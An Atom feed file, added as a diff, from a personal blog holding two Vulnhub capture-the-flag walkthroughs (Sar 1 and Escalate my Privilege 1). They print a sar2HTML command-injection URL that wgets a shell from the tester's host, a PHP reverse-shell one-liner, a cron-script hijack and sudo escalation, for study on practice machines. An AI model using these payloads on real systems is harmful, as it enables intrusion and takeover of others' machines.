@@ -1,0 +1,141 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-20T14:42:21+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Kasyap Girijan’s Blog</title><author><name>Kasyap Girijan</name></author><entry><title type="html">Vulnhub: Sar 1</title><link href="http://localhost:4000/vulnhub_ctf/2020/04/12/Vulnhub-Sar1-Writeup.html" rel="alternate" type="text/html" title="Vulnhub: Sar 1" /><published>2020-04-12T16:03:36+05:30</published><updated>2020-04-12T16:03:36+05:30</updated><id>http://localhost:4000/vulnhub_ctf/2020/04/12/Vulnhub%20Sar1%20Writeup</id><content type="html" xml:base="http://localhost:4000/vulnhub_ctf/2020/04/12/Vulnhub-Sar1-Writeup.html">&lt;p&gt;Hello All, Today I am writing a walkthrough on vulnhub machine Sar: 1.&lt;/p&gt;
+
+&lt;p&gt;As per the creator of this machine “Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.”&lt;/p&gt;
+
+&lt;p&gt;Let us begin with basic enumerations!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Network Scanning:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The Nmap scan &lt;strong&gt;&lt;em&gt;“nmap -A -T4 192.168.0.101”&lt;/em&gt;&lt;/strong&gt; gives the below output.
+&lt;img src=&quot;/images/sar1_1.png&quot; alt=&quot;nmap&quot; /&gt;
+As mentioned in the result we can observe that HTTP service would be landing us into the default apache web page.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;_Enumeration:&lt;/em&gt;
+So without wasting much time I went ahead and ran a dirb to identify the web contents.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;dirb http://192.168.0.101/&lt;/em&gt;&lt;/strong&gt; which gave the following result.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_2.png&quot; alt=&quot;dirb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at robots.txt file we landed to &lt;em&gt;&lt;strong&gt;http://192.168.0.101/sar2HTML/&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_3.png&quot; alt=&quot;sar2html&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Further with google-fu identified an exploit-db result with exploit details for the relevant version of sar2html&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_4.png&quot; alt=&quot;sar2html&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;According to exploit-db : any commands entered after &lt;em&gt;&lt;strong&gt;“plot=;”&lt;/strong&gt;&lt;/em&gt; will be executed by the application and can be seen at the host dropdown option towards the left panel of the application while selecting the host.&lt;/p&gt;
+
+&lt;p&gt;So lets try this crafted payload: &lt;strong&gt;http://192.168.0.101/sar2HTML/index.php?plot=NEW;ls&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_5.png&quot; alt=&quot;sar2html&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Provided that I went ahead and tried if we could download anything to the application using &lt;strong&gt;“wget”&lt;/strong&gt; command. It worked!! moving ahead I modified the &lt;strong&gt;&lt;em&gt;“php_reverse_shell.php”&lt;/em&gt;&lt;/strong&gt; file and started &lt;strong&gt;“netcat listener on 1234”&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;http://192.168.0.101/sar2HTML/index.php?plot=NEW;wget&lt;/strong&gt;
+&lt;strong&gt;http://192.168.0.195:8000/shell.php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_6.png&quot; alt=&quot;sar2html&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And by accessing the uploaded shell.php file it gives us a shell of &lt;strong&gt;www-data&lt;/strong&gt; user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_7.png&quot; alt=&quot;sar2html&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using &lt;strong&gt;python3 -c “import pty;pty.spwan(‘/bin/bash’)”;&lt;/strong&gt; I broke the TTY shell.&lt;/p&gt;
+
+&lt;p&gt;Without wasting time I went ahead and transferred LinEnum.sh script to the target machine using a simple HTTP server.&lt;/p&gt;
+
+&lt;p&gt;The script can be downloaded here:&lt;strong&gt;https://github.com/rebootuser/LinEnum&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;And transferred it through:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;www-data@sar:/var/www/html$ wget http://192.168.0.195:8000/LinEnum.sh &amp;amp;&amp;amp; chmod +x LinEnum.sh&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;By running the script it was able to identify a cronjob is running to execute &lt;strong&gt;&lt;em&gt;“finally.sh”&lt;/em&gt;&lt;/strong&gt; under &lt;strong&gt;&lt;em&gt;“/var/www/html”&lt;/em&gt;&lt;/strong&gt; directory every &lt;strong&gt;5 minutes&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_8.png&quot; alt=&quot;cornjob&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So, I went ahead and read the script with cat command finally.sh and could understand that it again executes another script in the same directory &lt;strong&gt;write.sh&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Listing &lt;strong&gt;&lt;em&gt;/var/www/html&lt;/em&gt;&lt;/strong&gt; directory we could see that the user &lt;strong&gt;www-data&lt;/strong&gt; has access to write.sh.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_9.png&quot; alt=&quot;cornjob&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Moving ahead I deleted the &lt;strong&gt;write.sh&lt;/strong&gt; file and created a new one with a reverse shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_10.png&quot; alt=&quot;cornjob&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I transferred the file to target machine and started netcat listener on port &lt;strong&gt;4444&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_11.png&quot; alt=&quot;cornjob&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I waited for a few minutes and got my root reverse shell (since cronjob will execute the command in write.sh with sudo privilege).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sar1_12.png&quot; alt=&quot;cornjob&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That’s it. We got the root access and the flags can be collected under /home/love/Desktop and /root/ folder. Thank you !&lt;/p&gt;</content><author><name>Kasyap Girijan</name></author><category term="Vulnhub_CTF" /><category term="Writeup;" /><category term="Walkthrough" /><summary type="html">Hello All, Today I am writing a walkthrough on vulnhub machine Sar: 1. As per the creator of this machine “Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.” Let us begin with basic enumerations! Network Scanning: The Nmap scan “nmap -A -T4 192.168.0.101” gives the below output. As mentioned in the result we can observe that HTTP service would be landing us into the default apache web page. _Enumeration: So without wasting much time I went ahead and ran a dirb to identify the web contents. dirb http://192.168.0.101/ which gave the following result. Looking at robots.txt file we landed to http://192.168.0.101/sar2HTML/ Further with google-fu identified an exploit-db result with exploit details for the relevant version of sar2html According to exploit-db : any commands entered after “plot=;” will be executed by the application and can be seen at the host dropdown option towards the left panel of the application while selecting the host. So lets try this crafted payload: http://192.168.0.101/sar2HTML/index.php?plot=NEW;ls Provided that I went ahead and tried if we could download anything to the application using “wget” command. It worked!! moving ahead I modified the “php_reverse_shell.php” file and started “netcat listener on 1234” http://192.168.0.101/sar2HTML/index.php?plot=NEW;wget http://192.168.0.195:8000/shell.php And by accessing the uploaded shell.php file it gives us a shell of www-data user. Using python3 -c “import pty;pty.spwan(‘/bin/bash’)”; I broke the TTY shell. Without wasting time I went ahead and transferred LinEnum.sh script to the target machine using a simple HTTP server. The script can be downloaded here:https://github.com/rebootuser/LinEnum And transferred it through: www-data@sar:/var/www/html$ wget http://192.168.0.195:8000/LinEnum.sh &amp;amp;&amp;amp; chmod +x LinEnum.sh By running the script it was able to identify a cronjob is running to execute “finally.sh” under “/var/www/html” directory every 5 minutes. So, I went ahead and read the script with cat command finally.sh and could understand that it again executes another script in the same directory write.sh. Listing /var/www/html directory we could see that the user www-data has access to write.sh. Moving ahead I deleted the write.sh file and created a new one with a reverse shell. I transferred the file to target machine and started netcat listener on port 4444. I waited for a few minutes and got my root reverse shell (since cronjob will execute the command in write.sh with sudo privilege). That’s it. We got the root access and the flags can be collected under /home/love/Desktop and /root/ folder. Thank you !</summary></entry><entry><title type="html">Escalate my Privilege 1</title><link href="http://localhost:4000/vulnhub_ctf/2020/04/10/Escalate-my-Privilege.html" rel="alternate" type="text/html" title="Escalate my Privilege 1" /><published>2020-04-10T16:03:36+05:30</published><updated>2020-04-10T16:03:36+05:30</updated><id>http://localhost:4000/vulnhub_ctf/2020/04/10/Escalate%20my%20Privilege</id><content type="html" xml:base="http://localhost:4000/vulnhub_ctf/2020/04/10/Escalate-my-Privilege.html">&lt;p&gt;Hello all, Today we will see a walkthrough on “escalate my privilege” machine from vulnhub.&lt;/p&gt;
+
+&lt;p&gt;According to the author this box is specially made for learning and sharpening Linux Privilege Escalation skills.&lt;/p&gt;
+
+&lt;p&gt;The difficulty of this machine is set to Easy / Beginner Level. You can download the machine from https://www.vulnhub.com/series/escalate-my-privileges,291/.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Testing Methodology:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Network Scanning:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Let us scan for the local N/W and identify the IP address of the machine using netdiscover.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/emp1_1.png&quot; alt=&quot;netdiscover&quot; /&gt;
+&lt;img src=&quot;/images/emp1_2.png&quot; alt=&quot;netdiscover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Post identifying the IP our next step will be to identifying the running ports and servers using Nmap.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/emp1_3.png&quot; alt=&quot;netdiscover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Enumeration:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Within the Nmap scan, we can identify that there is a page called /phpbash.php&lt;/p&gt;
+
+&lt;p&gt;So I went ahead to the URL http://192.168.0.180/phpbash.php and could see the bash terminal. And I ran the id command which gives user-id Apache in the output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/emp1_4.png&quot; alt=&quot;netdiscover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Post that I went ahead with a PHP reverse shell and Netcat listener on port &lt;strong&gt;4444&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Netcat command: &lt;strong&gt;nc -lvp 4444.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;PHP reverse shell:&lt;strong&gt;php -r $sock=fsockopen(“192.168.0.195”,4444);exec(“/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3”);’&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/emp1_5.png&quot; alt=&quot;netdiscover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After getting the reverse shell from the machine, on listing the directory found readme.txt file and reading it revealed the username Armour.&lt;/p&gt;
+
+&lt;p&gt;I went ahead and looked into the /home directory of the user armour and found Credentials.txt file.&lt;/p&gt;
+
+&lt;p&gt;On reading the file using cat command it displayed a message “ my password is md5(rootroot1)”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/emp1_6.png&quot; alt=&quot;netdiscover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Probably the password to login to armour user would be md5 hash of “rootroot1”.&lt;/p&gt;
+
+&lt;p&gt;I opened up a new terminal and using the &lt;strong&gt;&lt;em&gt;echo -n “rootroot1” | md5sum&lt;/em&gt;&lt;/strong&gt; command got the md5 of
+&lt;strong&gt;“rootroot1”:b7bc8489abe360486b4b19dbc242e885.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Privilege Escalation:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the hash generated I was able to successfully log in to armour using switch user. Which gave a blank shell and had to break it using python TTY command.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;python3 -c ‘import pty;pty.spawn(“/bin/bash”)’&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/emp1_7.png&quot; alt=&quot;netdiscover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Post that I ran &lt;strong&gt;&lt;em&gt;“sudo -l”&lt;/em&gt;&lt;/strong&gt; command to see if there is any sudoer file entry and could identify there well a lot of it. And as mentioned earlier there are several ways to do privilege escalation on this machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/emp1_8.png&quot; alt=&quot;netdiscover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Given that, I used the command &lt;strong&gt;&lt;em&gt;“sudo /bin/bash”&lt;/em&gt;&lt;/strong&gt; which gave me the root shell and found the flag “proof.txt” under the root directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/emp1_9.png&quot; alt=&quot;netdiscover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And that’s it, this concludes the walkthrough, thank you.&lt;/p&gt;</content><author><name>Kasyap Girijan</name></author><category term="Vulnhub_CTF" /><category term="Writeup;" /><category term="Walkthrough" /><summary type="html">Hello all, Today we will see a walkthrough on “escalate my privilege” machine from vulnhub. According to the author this box is specially made for learning and sharpening Linux Privilege Escalation skills. The difficulty of this machine is set to Easy / Beginner Level. You can download the machine from https://www.vulnhub.com/series/escalate-my-privileges,291/. Testing Methodology: Network Scanning: Let us scan for the local N/W and identify the IP address of the machine using netdiscover. Post identifying the IP our next step will be to identifying the running ports and servers using Nmap. Enumeration: Within the Nmap scan, we can identify that there is a page called /phpbash.php So I went ahead to the URL http://192.168.0.180/phpbash.php and could see the bash terminal. And I ran the id command which gives user-id Apache in the output. Post that I went ahead with a PHP reverse shell and Netcat listener on port 4444. Netcat command: nc -lvp 4444. PHP reverse shell:php -r $sock=fsockopen(“192.168.0.195”,4444);exec(“/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3”);’ After getting the reverse shell from the machine, on listing the directory found readme.txt file and reading it revealed the username Armour. I went ahead and looked into the /home directory of the user armour and found Credentials.txt file. On reading the file using cat command it displayed a message “ my password is md5(rootroot1)”. Probably the password to login to armour user would be md5 hash of “rootroot1”. I opened up a new terminal and using the echo -n “rootroot1” | md5sum command got the md5 of “rootroot1”:b7bc8489abe360486b4b19dbc242e885. Privilege Escalation: Using the hash generated I was able to successfully log in to armour using switch user. Which gave a blank shell and had to break it using python TTY command. python3 -c ‘import pty;pty.spawn(“/bin/bash”)’ Post that I ran “sudo -l” command to see if there is any sudoer file entry and could identify there well a lot of it. And as mentioned earlier there are several ways to do privilege escalation on this machine. Given that, I used the command “sudo /bin/bash” which gave me the root shell and found the flag “proof.txt” under the root directory. And that’s it, this concludes the walkthrough, thank you.</summary></entry></feed>
